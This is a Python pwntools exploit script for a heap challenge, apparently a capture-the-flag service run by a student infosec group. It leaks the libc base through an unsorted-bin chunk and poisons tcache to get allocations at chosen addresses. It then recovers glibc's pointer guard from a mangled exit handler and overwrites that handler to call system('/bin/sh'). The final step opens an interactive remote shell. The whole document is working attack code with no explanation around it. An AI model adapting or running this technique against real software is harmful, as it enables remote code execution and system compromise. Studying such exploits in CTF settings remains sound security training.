from pwn import *

context.log_level = "info"
HOST, PORT = "chall.nypinfosec.net", 8002

# From your work
UNSORTED_OFFSET = 0x210b20
ENVIRON_OFF     = 0x217e28
INITIAL_OFF     = 0x212000

# From your local mappings: ld base was libc_base + 0x3c1000
LD_DELTA = 0x3c1000
DL_FINI_OFF = 0x5160

def rol(x, r):
    return ((x << r) | (x >> (64 - r))) & 0xffffffffffffffff

def ror(x, r):
    return ((x >> r) | (x << (64 - r))) & 0xffffffffffffffff

def mangle(ptr, guard):
    # glibc pointer mangling: rol(ptr ^ guard, 0x11)
    return rol(ptr ^ guard, 0x11)

def start():
    return remote(HOST, PORT)

def menu(io, c): io.sendlineafter(b"> ", str(c).encode())
def buy(io, i):  menu(io, 1); io.sendlineafter(b"> ", str(i).encode())
def sell(io, i): menu(io, 4); io.sendlineafter(b"> ", str(i).encode())
def name(io, i, data):
    menu(io, 2)
    io.sendlineafter(b"> ", str(i).encode())
    io.sendafter(b"Name your labubu\n", data)
def admire(io, i):
    menu(io, 3)
    io.sendlineafter(b"> ", str(i).encode())
    return io.recvn(0x400)

io = start()

# -------------------------
# 1) libc leak (unsorted)
# -------------------------
for i in range(10):
    buy(io, i)

for i in range(7):
    sell(io, i)
sell(io, 7)  # unsorted (idx8 fence)

leak = admire(io, 7)
fd = u64(leak[:8])
libc_base = fd - UNSORTED_OFFSET
log.success(f"libc_base = {hex(libc_base)}")

# -------------------------
# 2) Drain this tcache bin (7 entries)
# -------------------------
for i in range(7):
    buy(io, i)

# Helper: make single-entry tcache chunk at idx9 and get (chunk>>12, key)
def prep_single(idx=9):
    sell(io, idx)
    d = admire(io, idx)
    chunk_shift = u64(d[:8])      # chunk>>12 when next == NULL
    tcache_key  = u64(d[8:16])    # must preserve
    return chunk_shift, tcache_key

# Helper: poison tcache so next malloc returns target address
def malloc_at(target, poison_idx=9, out_idx_a=9, out_idx_b=8):
    chunk_shift, key = prep_single(poison_idx)
    poison_fd = target ^ chunk_shift
    name(io, poison_idx, p64(poison_fd) + p64(key) + b"\n")
    buy(io, out_idx_a)  # pops poisoned entry
    buy(io, out_idx_b)  # returns "chunk" at target, stored at out_idx_b
    return out_idx_b

# -------------------------
# 3) Leak existing mangled fn from initial->fns[0].cxa.fn (at initial+0x18)
# -------------------------
# 3) Leak existing mangled fn from initial->fns[0] (aligned at +0x10)
initial_addr = libc_base + INITIAL_OFF
entry_addr   = initial_addr + 0x10   # 16-byte aligned

idx = malloc_at(entry_addr)
d = admire(io, idx)

flavor = u64(d[0:8])
mangled_existing = u64(d[8:16])      # cxa.fn sits right after flavor

log.success(f"flavor = {hex(flavor)} (expected 0x4)")
log.success(f"mangled existing fn = {hex(mangled_existing)}")

if flavor != 4:
    log.error("Not reading the exit handler entry (flavor != 4). Alignment/offset wrong.")
    io.close()
    exit(1)

# -------------------------
# 4) Recover pointer_guard assuming existing fn is _dl_fini
# -------------------------
ld_base = libc_base + LD_DELTA
dl_fini = ld_base + DL_FINI_OFF

guard = ror(mangled_existing, 0x11) ^ dl_fini
log.success(f"ld_base  = {hex(ld_base)}")
log.success(f"_dl_fini = {hex(dl_fini)}")
log.success(f"guard    = {hex(guard)}")

# -------------------------
# 5) Build our desired exit_function entry: flavor=4, fn=system, arg="/bin/sh", dso=0
# Write it into initial->fns[0] at initial+0x10
# -------------------------
libc = ELF("./libc.so.6", checksec=False)
system = libc_base + libc.sym["system"]
binsh  = libc_base + next(libc.search(b"/bin/sh\x00"))

m_system = mangle(system, guard)

log.success(f"system = {hex(system)}  /bin/sh = {hex(binsh)}")
log.success(f"mangled(system) = {hex(m_system)}")

target_entry = initial_addr + 0x10
idx2 = malloc_at(target_entry)

payload = (
    p64(4) +               # flavor (ef_cxa)
    p64(m_system) +        # func.cxa.fn (MANGLED)
    p64(binsh) +           # func.cxa.arg
    p64(0)                 # func.cxa.dso_handle
    + b"\n"
)
name(io, idx2, payload)

log.success("Overwritten initial exit handler. Triggering exit...")

# -------------------------
# 6) Trigger exit: choose option 5 (default -> exit(0))
# -------------------------
menu(io, 5)

io.interactive()
